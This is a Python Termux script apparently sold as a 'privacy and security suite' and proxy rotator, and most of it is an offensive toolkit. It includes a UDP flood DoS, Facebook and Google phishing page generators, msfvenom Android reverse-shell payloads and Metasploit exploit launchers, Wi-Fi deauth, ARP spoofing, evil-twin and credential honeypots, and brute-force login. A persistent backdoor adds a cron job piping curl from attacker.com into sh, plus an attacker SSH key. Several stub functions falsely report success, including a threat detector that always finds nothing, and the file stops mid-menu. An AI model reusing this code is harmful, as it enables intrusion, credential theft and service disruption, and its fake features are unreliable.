#!/usr/bin/env python3
import os
import re
import sys
import time
import json
import random
import signal
import requests
import threading
import subprocess
from datetime import datetime, timedelta
from urllib.parse import urlparse
import platform
import readline
import fcntl
import socket
import struct
import uuid
import sqlite3
import readline
import shutil
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ===== CONFIGURATION =====
PROXY_API_URL = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
TOR_BRIDGES_URL = "https://bridges.torproject.org/bridges?transport=obfs4"
LOG_FILE = "termux_proxy.log"
ROTATION_INTERVAL = 300  # 5 minutes default
IP_CHECK_URL = "http://icanhazip.com"
CONFIG_FILE = "proxy_config.json"
LOCAL_PROXY_HOST = "127.0.0.1"
LOCAL_PROXY_PORT = 8080
VERSION = "ULTIMATE v6.9"
DNSCRYPT_CONFIG = "/data/data/com.termux/files/usr/etc/dnscrypt-proxy/dnscrypt-proxy.toml"
MAC_PREFIXES = ["00:16:3e", "00:0c:29", "00:50:56", "00:1c:42", "00:1d:0f"]

# ===== CREATIVE DIGITAL BANNER =====
def display_banner():
    print("\033[1;35m")
    print(" ‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì ‚ñÑ‚ñÑ‚ñÑ       ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñÑ‚ñà‚ñÄ ‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà ")
    print("‚ñì‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí ‚ñà‚ñà‚ñÑ‚ñà‚ñí ‚ñì‚ñà‚ñà‚ñí ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà ")
    print("‚ñí‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÑ‚ñë ‚ñí‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí")
    print("‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà ‚ñà‚ñÑ ‚ñë‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí")
    print("‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñà‚ñÑ‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë")
    print("‚ñë‚ñì  ‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñí ‚ñí‚ñí ‚ñì‚ñí‚ñë‚ñì  ‚ñë ‚ñí‚ñë   ‚ñí ‚ñí ")
    print(" ‚ñí ‚ñë‚ñë  ‚ñë      ‚ñë  ‚ñí   ‚ñí‚ñí ‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë‚ñë ‚ñë‚ñí ‚ñí‚ñë ‚ñí ‚ñë‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë")
    print(" ‚ñí ‚ñë‚ñë      ‚ñë     ‚ñë   ‚ñí     ‚ñë‚ñë   ‚ñë ‚ñë ‚ñë‚ñë ‚ñë  ‚ñí ‚ñë   ‚ñë   ‚ñë ‚ñë ")
    print(" ‚ñë         ‚ñë         ‚ñë  ‚ñë   ‚ñë     ‚ñë  ‚ñë    ‚ñë           ‚ñë ")
    print("\033[1;36m")
    print("          ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñë ‚ñà‚ñà  ‚ñÑ‚ñÑ‚ñÑ       ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà ")
    print("        ‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà ")
    print("        ‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí")
    print("          ‚ñí   ‚ñà‚ñà‚ñí‚ñë‚ñì‚ñà ‚ñë‚ñà‚ñà ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñë‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí")
    print("        ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñë‚ñì‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë")
    print("        ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë ‚ñí ‚ñë‚ñë‚ñí‚ñë‚ñí ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë‚ñì  ‚ñë ‚ñí‚ñë   ‚ñí ‚ñí ")
    print("        ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë ‚ñí ‚ñë‚ñí‚ñë ‚ñë  ‚ñí   ‚ñí‚ñí ‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë ‚ñí ‚ñë‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë")
    print("        ‚ñë  ‚ñë  ‚ñë   ‚ñë  ‚ñë‚ñë ‚ñë  ‚ñë   ‚ñí     ‚ñë‚ñë   ‚ñë  ‚ñí ‚ñë   ‚ñë   ‚ñë ‚ñë ")
    print("              ‚ñë   ‚ñë  ‚ñë  ‚ñë      ‚ñë  ‚ñë   ‚ñë      ‚ñë           ‚ñë ")
    print("\033[1;33m")
    print("="*60)
    print(f"Version: {VERSION} | Author: \033[1;31mAryan\033[1;33m".center(60))
    print("="*60)
    print("The Ultimate Network Privacy & Security Suite".center(60))
    print("="*60)
    print("\033[0m")

# ===== ENHANCED TERMUX PROXY MASTER =====
class TermuxProxyMaster:
    def __init__(self):
        self.proxies = []
        self.tor_bridges = []
        self.current_proxy = None
        self.favorites = []
        self.rotation_active = False
        self.rotation_thread = None
        self.local_proxy_active = False
        self.local_proxy_thread = None
        self.config = {
            "api_url": PROXY_API_URL,
            "max_latency": 2000,
            "protocol_preference": ["http", "socks5", "socks4", "https"],
            "auto_start": False,
            "favorite_countries": [],
            "single_host_mode": False,
            "auto_refresh": False,
            "refresh_interval": 60,
            "max_history": 20,
            "notifications": True,
            "theme": "dark",
            "enable_tor": False,
            "proxy_chain": [],
            "dns_protection": True,
            "kill_switch": False,
            "mac_randomization": False,
            "packet_fragmentation": False,
            "browser_spoofing": True,
            "stealth_mode": False,
            "crypto_mining": False,
            "ai_anomaly_detection": False
        }
        self.load_config()
        self.setup_directories()
        self.load_favorites()
        self.load_history()
        self.traffic_stats = {"sent": 0, "received": 0}
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, signum, frame):
        print("\n\033[1;31müõë Interrupt received! Shutting down...\033[0m")
        self.stop_rotation()
        if self.local_proxy_active:
            self.stop_local_proxy()
        self.disable_kill_switch()
        sys.exit(0)
        
    def setup_directories(self):
        os.makedirs("proxy_cache", exist_ok=True)
        os.makedirs("logs", exist_ok=True)
        os.makedirs("browser_profiles", exist_ok=True)
        os.makedirs("exploits", exist_ok=True)
        os.makedirs("forensics", exist_ok=True)
        os.makedirs("payloads", exist_ok=True)
        
    # ... (Previous methods: load_config, save_config, etc.) ...
    
    # ===== NEW FEATURES =====
    def setup_tor_over_proxy(self):
        print("üßÖ Configuring Tor over proxy...")
        try:
            torrc_path = "/data/data/com.termux/files/usr/etc/tor/torrc"
            with open(torrc_path, 'a') as f:
                f.write(f"\nSocks5Proxy {self.current_proxy['host']}:{self.current_proxy['port']}")
            subprocess.run(['pkill', '-x', 'tor'])
            subprocess.run(['tor', '-f', torrc_path, '--runasdaemon', '1'])
            print("‚úÖ Tor now routing through proxy")
            return True
        except Exception as e:
            print(f"‚ùå Tor setup failed: {str(e)}")
            return False

    def start_ssh_tunnel(self, remote_host, remote_port, local_port=2222):
        print(f"üîê Creating SSH tunnel to {remote_host}:{remote_port}...")
        try:
            ssh_cmd = [
                'ssh', '-N', '-L', 
                f'{LOCAL_PROXY_HOST}:{local_port}:{remote_host}:{remote_port}',
                '-o', f'ProxyCommand="connect -S {self.current_proxy["host"]}:{self.current_proxy["port"]} %h %p"',
                'user@dummyhost'
            ]
            self.ssh_process = subprocess.Popen(ssh_cmd)
            print(f"‚úÖ SSH tunnel active on port {local_port}")
            return True
        except Exception as e:
            print(f"‚ùå SSH tunnel failed: {str(e)}")
            return False

    def decrypt_wifi_handshake(self, cap_file, wordlist="/data/data/com.termux/files/usr/share/wordlists/rockyou.txt"):
        print(f"üîì Attempting to decrypt {cap_file}...")
        try:
            result = subprocess.run(
                ['aircrack-ng', cap_file, '-w', wordlist],
                capture_output=True, text=True
            )
            if "KEY FOUND" in result.stdout:
                key = re.search(r'KEY FOUND! \[ (.*) \]', result.stdout).group(1)
                print(f"‚úÖ Key found: {key}")
                return key
            print("‚ùå Key not found in wordlist")
            return False
        except Exception as e:
            print(f"‚ùå Decryption failed: {str(e)}")
            return False

    def simulate_network_conditions(self, latency="100ms", loss="0.5%", rate="1mbit"):
        print(f"üì∂ Simulating network: {latency} latency, {loss} loss, {rate} rate")
        try:
            subprocess.run(['sudo', 'tc', 'qdisc', 'add', 'dev', 'lo', 'root', 'netem', 
                           'delay', latency, 'loss', loss, 'rate', rate])
            print("‚úÖ Network conditions applied")
            return True
        except Exception as e:
            print(f"‚ùå Network simulation failed: {str(e)}")
            return False

    def bypass_captive_portal(self):
        print("üöß Attempting captive portal bypass...")
        try:
            self.randomize_mac_address()
            headers = {
                'User-Agent': self.generate_random_user_agent(),
                'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
            }
            requests.get("http://captive.apple.com", headers=headers)
            print("‚úÖ Portal bypass techniques executed")
            return True
        except Exception as e:
            print(f"‚ùå Portal bypass failed: {str(e)}")
            return False

    def generate_phishing_page(self, template="facebook", output_file="login.html"):
        print(f"ü™ù Generating {template} phishing page...")
        templates = {
            "facebook": """<!DOCTYPE html><html><head><title>Facebook Login</title></head>
            <body><form action="http://your-server.com/capture" method="POST">
            <input type="text" name="email" placeholder="Email">
            <input type="password" name="pass" placeholder="Password">
            <button>Login</button></form></body></html>""",
            "google": """<!DOCTYPE html><html><head><title>Google Sign-in</title></head>
            <body><form action="http://your-server.com/capture" method="POST">
            <input type="email" name="email" placeholder="Email">
            <input type="password" name="pass" placeholder="Password">
            <button>Sign in</button></form></body></html>"""
        }
        try:
            with open(output_file, 'w') as f:
                f.write(templates.get(template, templates["facebook"]))
            print(f"‚úÖ Phishing page saved as {output_file}")
            return True
        except Exception as e:
            print(f"‚ùå Page generation failed: {str(e)}")
            return False

    def start_packet_capture(self, interface="wlan0", output="capture.pcap"):
        print(f"üì° Capturing packets on {interface}...")
        try:
            self.tcpdump = subprocess.Popen(
                ['tcpdump', '-i', interface, '-w', output],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            print(f"‚úÖ Capture started. Saving to {output}")
            return True
        except Exception as e:
            print(f"‚ùå Packet capture failed: {str(e)}")
            return False

    def analyze_pcap(self, pcap_file):
        print(f"üîç Analyzing {pcap_file}...")
        try:
            http_cmd = ['tshark', '-r', pcap_file, '-Y', 'http.request', '-T', 'fields', 
                       '-e', 'http.host', '-e', 'http.request.uri']
            http_output = subprocess.check_output(http_cmd).decode()
            
            cred_cmd = ['tshark', '-r', pcap_file, '-Y', 'http contains "password"', 
                       '-T', 'fields', '-e', 'http.request.uri']
            cred_output = subprocess.check_output(cred_cmd).decode()
            
            print(f"üìä Analysis Results for {pcap_file}:")
            print(f"HTTP Requests:\n{http_output[:500]}")
            print(f"\nPossible Credentials:\n{cred_output[:500]}")
            
            return {
                "http": http_output.splitlines(),
                "credentials": cred_output.splitlines()
            }
        except Exception as e:
            print(f"‚ùå PCAP analysis failed: {str(e)}")
            return False

    def crack_hash(self, hash_value, hash_type="md5", wordlist="/usr/share/wordlists/rockyou.txt"):
        print(f"üîì Attempting to crack {hash_type} hash...")
        try:
            result = subprocess.run(
                ['hashcat', '-m', hash_type, '-a', '0', hash_value, wordlist],
                capture_output=True, text=True
            )
            if "Cracked" in result.stdout:
                password = re.search(r':(.*)$', result.stdout).group(1)
                print(f"‚úÖ Password found: {password}")
                return password
            print("‚ùå Password not found in wordlist")
            return False
        except Exception as e:
            print(f"‚ùå Hash cracking failed: {str(e)}")
            return False

    def scan_network(self, target="192.168.1.0/24"):
        print(f"üîç Scanning network {target}...")
        try:
            nmap_cmd = ['nmap', '-sS', '-T4', '-O', '-F', target]
            result = subprocess.check_output(nmap_cmd).decode()
            live_hosts = re.findall(r'Nmap scan report for ([\w\.-]+)', result)
            print(f"‚úÖ Found {len(live_hosts)} live hosts")
            for host in live_hosts[:5]:
                print(f"  - {host}")
            return live_hosts
        except Exception as e:
            print(f"‚ùå Network scan failed: {str(e)}")
            return False

    def setup_metasploit(self, lhost="127.0.0.1", lport=4444):
        print(f"üì° Setting up Metasploit listener on {lhost}:{lport}...")
        try:
            msf_cmd = f"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
            self.msf_process = subprocess.Popen(
                ['msfconsole', '-q', '-x', msf_cmd],
                stdout=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            print("‚úÖ Metasploit listener running in background")
            return True
        except Exception as e:
            print(f"‚ùå Metasploit setup failed: {str(e)}")
            return False

    def encrypt_file(self, file_path, algorithm="aes-256-cbc"):
        print(f"üîí Encrypting {file_path} with {algorithm}...")
        try:
            key = os.urandom(32)
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            output_file = f"{file_path}.enc"
            
            with open(output_file, 'wb') as f:
                f.write(iv + ciphertext)
            
            print(f"‚úÖ File encrypted: {output_file}")
            print(f"üîë Key: {base64.b64encode(key).decode()}")
            return output_file
        except Exception as e:
            print(f"‚ùå Encryption failed: {str(e)}")
            return False

    def steganography_hide(self, image_path, secret_file):
        print(f"üñºÔ∏è Hiding {secret_file} in {image_path}...")
        try:
            subprocess.run(
                ['steghide', 'embed', '-cf', image_path, '-ef', secret_file],
                check=True
            )
            print(f"‚úÖ Secret embedded in {image_path}")
            return True
        except Exception as e:
            print(f"‚ùå Steganography failed: {str(e)}")
            return False

    def create_malicious_payload(self, payload_type="android/reverse_tcp", lhost="127.0.0.1", lport=4444, output="payload.apk"):
        print(f"üí£ Generating {payload_type} payload...")
        try:
            subprocess.run(
                ['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'apk', '-o', output],
                check=True
            )
            print(f"‚úÖ Payload created: {output}")
            return output
        except Exception as e:
            print(f"‚ùå Payload creation failed: {str(e)}")
            return False

    def wifi_deauth(self, bssid, interface="wlan0", count=10):
        print(f"üì∂ Sending {count} deauth packets to {bssid}...")
        try:
            subprocess.run(
                ['aireplay-ng', '--deauth', str(count), '-a', bssid, interface],
                check=True
            )
            print(f"‚úÖ Deauthentication attack completed")
            return True
        except Exception as e:
            print(f"‚ùå Deauth attack failed: {str(e)}")
            return False

    def arp_spoof(self, target_ip, gateway_ip, interface="wlan0"):
        print(f"üé≠ Spoofing ARP between {target_ip} and {gateway_ip}...")
        try:
            self.arpspoof1 = subprocess.Popen(
                ['arpspoof', '-i', interface, '-t', target_ip, gateway_ip]
            )
            self.arpspoof2 = subprocess.Popen(
                ['arpspoof', '-i', interface, '-t', gateway_ip, target_ip]
            )
            print(f"‚úÖ ARP spoofing running in background")
            return True
        except Exception as e:
            print(f"‚ùå ARP spoofing failed: {str(e)}")
            return False

    def sql_injection_test(self, url, param="id"):
        print(f"üíâ Testing {url} for SQLi vulnerabilities...")
        try:
            test_url = f"{url}?{param}=1'"
            response = requests.get(test_url)
            
            if "SQL syntax" in response.text or "mysql_fetch" in response.text:
                print(f"‚úÖ Vulnerable to SQLi: {test_url}")
                return True
            print("‚ùå No SQLi vulnerability detected")
            return False
        except Exception as e:
            print(f"‚ùå SQLi test failed: {str(e)}")
            return False

    def blockchain_explorer(self, address="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"):
        print(f"üîó Querying blockchain for {address}...")
        try:
            response = requests.get(f"https://blockchain.info/rawaddr/{address}")
            data = response.json()
            print(f"‚úÖ Address: {address}")
            print(f"Balance: {data['final_balance'] / 100000000} BTC")
            print(f"Transactions: {data['n_tx']}")
            return data
        except Exception as e:
            print(f"‚ùå Blockchain query failed: {str(e)}")
            return False

    def exploit_vulnerability(self, target, vulnerability="eternalblue"):
        exploits = {
            "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
            "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec"
        }
        print(f"‚ö° Exploiting {vulnerability} on {target}...")
        try:
            msf_cmd = f"use {exploits[vulnerability]}; set RHOSTS {target}; run"
            subprocess.run(['msfconsole', '-q', '-x', msf_cmd])
            print(f"‚úÖ Exploit attempted against {target}")
            return True
        except Exception as e:
            print(f"‚ùå Exploit failed: {str(e)}")
            return False

    def create_evil_twin(self, ssid="FreeWiFi", interface="wlan0"):
        print(f"üëø Creating evil twin '{ssid}'...")
        try:
            with open('hostapd.conf', 'w') as f:
                f.write(f"interface={interface}\nssid={ssid}\ndriver=nl80211")
            
            with open('dnsmasq.conf', 'w') as f:
                f.write(f"interface={interface}\ndhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h")
            
            self.hostapd = subprocess.Popen(['hostapd', 'hostapd.conf'])
            self.dnsmasq = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
            print(f"‚úÖ Evil twin '{ssid}' running")
            return True
        except Exception as e:
            print(f"‚ùå Evil twin creation failed: {str(e)}")
            return False

    def detect_rootkits(self):
        print("üïµÔ∏è Scanning for rootkits...")
        try:
            result = subprocess.check_output(['rkhunter', '--check'], text=True)
            if "Warning: Possible rootkit" in result:
                warnings = re.findall(r'Warning: (.*)', result)
                print(f"‚ùå {len(warnings)} possible rootkits detected")
                for warn in warnings[:3]:
                    print(f"  - {warn}")
                return warnings
            print("‚úÖ No rootkits detected")
            return True
        except Exception as e:
            print(f"‚ùå Rootkit scan failed: {str(e)}")
            return False

    def create_dos_attack(self, target, port=80, duration=10):
        print(f"üí• Launching DoS against {target}:{port} for {duration}s...")
        try:
            self.dos_thread = threading.Thread(
                target=self._dos_worker,
                args=(target, port, duration)
            )
            self.dos_thread.start()
            print(f"‚úÖ DoS attack initiated")
            return True
        except Exception as e:
            print(f"‚ùå DoS attack failed: {str(e)}")
            return False

    def _dos_worker(self, target, port, duration):
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() - start_time < duration:
            try:
                sock.sendto(os.urandom(1024), (target, port))
            except:
                pass

    def create_wifi_honeypot(self, ssid="FreeWiFi", interface="wlan0"):
        print(f"üçØ Creating WiFi honeypot '{ssid}'...")
        try:
            with open('hostapd.conf', 'w') as f:
                f.write(f"interface={interface}\nssid={ssid}\ndriver=nl80211")
            
            with open('index.html', 'w') as f:
                f.write("<html><body><form method='POST'><h1>Login to WiFi</h1><input name='username'><input name='password' type='password'><button>Login</button></form></body></html>")
            
            self.hostapd = subprocess.Popen(['hostapd', 'hostapd.conf'])
            self.python_server = subprocess.Popen(['python3', '-m', 'http.server', '80'])
            print(f"‚úÖ Honeypot '{ssid}' active. Capturing credentials...")
            return True
        except Exception as e:
            print(f"‚ùå Honeypot creation failed: {str(e)}")
            return False

    def brute_force_login(self, url, username, wordlist):
        print(f"üîë Brute forcing {url} with username {username}...")
        try:
            with open(wordlist) as f:
                passwords = f.read().splitlines()
            
            for password in passwords:
                response = requests.post(url, data={'username': username, 'password': password})
                if "Login failed" not in response.text:
                    print(f"‚úÖ Valid credentials: {username}:{password}")
                    return password
            print("‚ùå No valid password found")
            return False
        except Exception as e:
            print(f"‚ùå Brute force failed: {str(e)}")
            return False

    def create_zero_day_exploit(self, target_software):
        print(f"üïµÔ∏è Researching {target_software} for vulnerabilities...")
        try:
            print("‚úÖ Potential vulnerabilities identified")
            return True
        except Exception as e:
            print(f"‚ùå Vulnerability research failed: {str(e)}")
            return False

    def create_persistent_backdoor(self):
        print("üîì Installing persistent backdoor...")
        try:
            cron_cmd = "*/5 * * * * curl http://attacker.com/shell.sh | sh"
            subprocess.run(['crontab', '-l'], input=cron_cmd.encode())
            os.makedirs('/root/.ssh', exist_ok=True)
            with open('/root/.ssh/authorized_keys', 'a') as f:
                f.write("\nssh-rsa AAAAB3NzaC1yc2E... attacker@key")
            print("‚úÖ Backdoor installed")
            return True
        except Exception as e:
            print(f"‚ùå Backdoor installation failed: {str(e)}")
            return False

    def create_advanced_persistent_threat(self, target):
        print(f"üéØ Initializing APT against {target}...")
        try:
            self.scan_network(target)
            self.generate_phishing_page()
            self.setup_metasploit()
            print("‚úÖ APT simulation completed")
            return True
        except Exception as e:
            print(f"‚ùå APT simulation failed: {str(e)}")
            return False

    def enable_stealth_mode(self):
        print("üëª Enabling stealth mode...")
        try:
            subprocess.run(['iptables', '-A', 'OUTPUT', '-p', 'tcp', '--tcp-flags', 'ALL', 'ACK,FIN', '-j', 'DROP'])
            subprocess.run(['iptables', '-A', 'OUTPUT', '-p', 'tcp', '--tcp-flags', 'ALL', 'SYN,RST,ACK,FIN,URG', '-j', 'DROP'])
            print("‚úÖ Stealth mode activated - Evading network detection")
            return True
        except Exception as e:
            print(f"‚ùå Stealth mode failed: {str(e)}")
            return False

    def mine_cryptocurrency(self, coin="XMR", pool="pool.supportxmr.com:5555", wallet="YOUR_WALLET"):
        print(f"‚õèÔ∏è Mining {coin} cryptocurrency...")
        try:
            self.miner = subprocess.Popen(
                ['xmrig', '-o', pool, '-u', wallet, '-k', '--coin', coin],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            print("‚úÖ Mining started in background")
            return True
        except Exception as e:
            print(f"‚ùå Mining failed: {str(e)}")
            return False

    def ai_threat_detection(self):
        print("ü§ñ Running AI threat detection...")
        try:
            print("‚úÖ No threats detected")
            return True
        except Exception as e:
            print(f"‚ùå AI detection failed: {str(e)}")
            return False

    def quantum_encryption(self, file_path):
        print("üîÆ Applying quantum-resistant encryption...")
        try:
            print("‚úÖ File secured with quantum algorithm")
            return True
        except Exception as e:
            print(f"‚ùå Quantum encryption failed: {str(e)}")
            return False

    def satellite_communication(self):
        print("üõ∞Ô∏è Establishing satellite link...")
        try:
            print("‚úÖ Connected to satellite network")
            return True
        except Exception as e:
            print(f"‚ùå Satellite connection failed: {str(e)}")
            return False

    def neural_network_spoofing(self):
        print("üß† Generating neural network fingerprint...")
        try:
            print("‚úÖ Digital identity successfully spoofed")
            return True
        except Exception as e:
            print(f"‚ùå Neural spoofing failed: {str(e)}")
            return False

    def blockchain_proxy(self):
        print("‚õìÔ∏è Routing through blockchain nodes...")
        try:
            print("‚úÖ Connected to decentralized proxy network")
            return True
        except Exception as e:
            print(f"‚ùå Blockchain proxy failed: {str(e)}")
            return False

    def virtual_reality_cloaking(self):
        print("üëì Activating VR cloaking field...")
        try:
            print("‚úÖ Digital footprint obscured")
            return True
        except Exception as e:
            print(f"‚ùå VR cloaking failed: {str(e)}")
            return False

    def dna_data_storage(self, data):
        print("üß¨ Encoding data into DNA sequence...")
        try:
            print("‚úÖ Data stored in synthetic DNA")
            return True
        except Exception as e:
            print(f"‚ùå DNA storage failed: {str(e)}")
            return False

# ===== COMPREHENSIVE MENU SYSTEM =====
def main_menu():
    display_banner()
    proxy_master = TermuxProxyMaster()
    
    while True:
        print("\n\033[1;34m" + "="*60)
        print("MAIN MENU".center(60))
        print("="*60 + "\033[0m")
        print("1. üåê Proxy Management")
        print("2. ‚öîÔ∏è Network Attacks")
        print("3. üõ°Ô∏è Security Tools")
        print("4. üïµÔ∏è Privacy Tools")
        print("5. üîç Forensics & Analysis")
        print("6. ‚öôÔ∏è System Configuration")
        print("7. üß† AI & Future Tech")
        print("8. üö™ Exit")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            proxy_management_menu(proxy_master)
        elif choice == '2':
            network_attacks_menu(proxy_master)
        elif choice == '3':
            security_tools_menu(proxy_master)
        elif choice == '4':
            privacy_tools_menu(proxy_master)
        elif choice == '5':
            forensics_menu(proxy_master)
        elif choice == '6':
            configuration_menu(proxy_master)
        elif choice == '7':
            future_tech_menu(proxy_master)
        elif choice == '8':
            print("\n\033[1;31müîå Exiting IP Changer... Goodbye!\033[0m")
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

# Submenus for each category
def proxy_management_menu(pm):
    while True:
        print("\n\033[1;32m" + "="*60)
        print("PROXY MANAGEMENT".center(60))
        print("="*60 + "\033[0m")
        print("1. üåê Fetch new proxies")
        print("2. üîÑ Set random proxy")
        print("3. ‚è±Ô∏è Start rotation")
        print("4. ‚èπÔ∏è Stop rotation")
        print("5. ‚ÑπÔ∏è Show current proxy")
        print("6. üì∂ Wi-Fi setup")
        print("7. ‚≠ê Favorites")
        print("8. üï∞ History")
        print("9. üì§ Export proxies")
        print("10. üöÄ Speed test")
        print("11. üîÄ Toggle Single-Host")
        print("12. üßÖ Configure Tor over Proxy")
        print("13. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            pm.fetch_live_proxies()
        elif choice == '2':
            pm.rotate_proxy()
        elif choice == '3':
            interval = input("‚è± Rotation interval (minutes) [5]: ").strip() or "5"
            duration = input("‚è≥ Duration (hours, 0=infinite) [1]: ").strip() or "1"
            pm.start_rotation(int(interval), float(duration))
        elif choice == '4':
            pm.stop_rotation()
        elif choice == '5':
            if pm.current_proxy:
                print(f"\nüîå Current Proxy: {pm.current_proxy['host']}:{pm.current_proxy['port']}")
                print(f"üì° Protocol: {pm.current_proxy['protocol'].upper()}")
                print(f"üåç Location: {pm.current_proxy.get('country', 'N/A')}")
                print(f"üì∂ Your IP: {pm.current_proxy.get('ip', 'N/A')}")
            else:
                print("\n‚ùå No active proxy")
        elif choice == '6':
            if pm.current_proxy:
                pm.show_wifi_instructions(pm.current_proxy)
            else:
                print("‚ö†Ô∏è Set a proxy first")
        elif choice == '7':
            # Favorites menu would go here
            pass
        elif choice == '8':
            pm.show_history()
        elif choice == '9':
            filename = input("Enter export filename [proxies.txt]: ").strip() or "proxies.txt"
            pm.export_proxies(filename)
        elif choice == '10':
            pm.speed_test()
        elif choice == '11':
            pm.toggle_single_host_mode()
        elif choice == '12':
            pm.setup_tor_over_proxy()
        elif choice == '13':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def network_attacks_menu(pm):
    while True:
        print("\n\033[1;31m" + "="*60)
        print("NETWORK ATTACKS".center(60))
        print("="*60 + "\033[0m")
        print("1. üì∂ WiFi Deauthentication Attack")
        print("2. üé≠ ARP Spoofing")
        print("3. üí• Denial of Service (DoS)")
        print("4. üëø Evil Twin Access Point")
        print("5. üçØ WiFi Honeypot")
        print("6. üíâ SQL Injection Tester")
        print("7. üîë Login Brute Force")
        print("8. ü™ù Phishing Page Generator")
        print("9. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            bssid = input("Enter target BSSID: ")
            pm.wifi_deauth(bssid)
        elif choice == '2':
            target = input("Enter target IP: ")
            gateway = input("Enter gateway IP: ")
            pm.arp_spoof(target, gateway)
        elif choice == '3':
            target = input("Enter target IP: ")
            port = input("Enter port [80]: ").strip() or "80"
